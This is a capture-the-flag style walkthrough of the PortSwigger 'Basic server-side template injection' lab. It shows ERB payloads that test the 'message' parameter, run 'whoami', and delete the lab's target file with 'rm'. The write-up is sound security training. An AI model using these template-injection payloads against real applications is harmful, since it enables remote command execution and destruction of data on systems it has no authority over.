
# PortSwigger Lab Walkthrough — Basic server-side template injection

## Overview

First, I tried to find where I could perform the attack. I inspected the application and found that the value in the URL was reflected on the webpage. This helped me identify a possible injection point.

After finding the parameter, I tested whether it was vulnerable to Server-Side Template Injection (SSTI). Once I confirmed the vulnerability, I used the ERB injection to execute the required command, remove the target file, and successfully solve the lab.

## 1. Identify the Injection Point

I inspected the URL and noticed that the `message` parameter controlled content displayed on the webpage:

```http
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
````

The interesting parameter was:

```text
message=Unfortunately this product is out of stock
```

Since this value was printed on the webpage, I tested it as a possible SSTI injection point.

## 2. Confirm the SSTI Vulnerability

To check whether the application evaluated ERB expressions, I replaced the original `message` value with:

```erb
<%= 7*7 %>
```
<img width="639" height="633" alt="screenshot_20260824_130013" src="https://github.com/user-attachments/assets/07efa9b6-6858-4a3b-aed9-7f5f20b92bc2" />

If the application displays:

```text
49
```
<img width="1920" height="1080" alt="screenshot_20260824_125923" src="https://github.com/user-attachments/assets/10dd40db-e5a5-4822-b922-2d927e43d611" />

this confirms that the server is evaluating the user-controlled input as an ERB template.

## 3. Confirm Code Execution

After confirming the SSTI vulnerability, I tested whether Ruby code could be executed on the server using:

```erb
<%= system("whoami") %>
```
<img width="1920" height="1080" alt="screenshot_20260824_125747" src="https://github.com/user-attachments/assets/6ff767ca-92d7-46e2-9cdd-44c30c8079aa" />

This confirmed that the ERB injection could execute server-side Ruby code and potentially run operating-system commands.

## 4. Remove the Target File

The objective of the lab was to delete:

```text
/home/carlos/morale.txt
```

After confirming the vulnerability, I used the following payload:

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

I placed this payload in the vulnerable `message` parameter and sent the request. The request was conceptually:

```http
GET /?message=<%= system("rm /home/carlos/morale.txt") %> HTTP/2
```

The application evaluated the ERB expression on the server, which executed the command:

```bash
rm /home/carlos/morale.txt
```

## 5. Lab Solved

Finally, the target file was successfully removed, and the lab was solved.

<img width="1920" height="1080" alt="screenshot_20260824_130531" src="https://github.com/user-attachments/assets/cf5b6cf0-3bdc-4690-b9d0-5c1e6c18f462" />
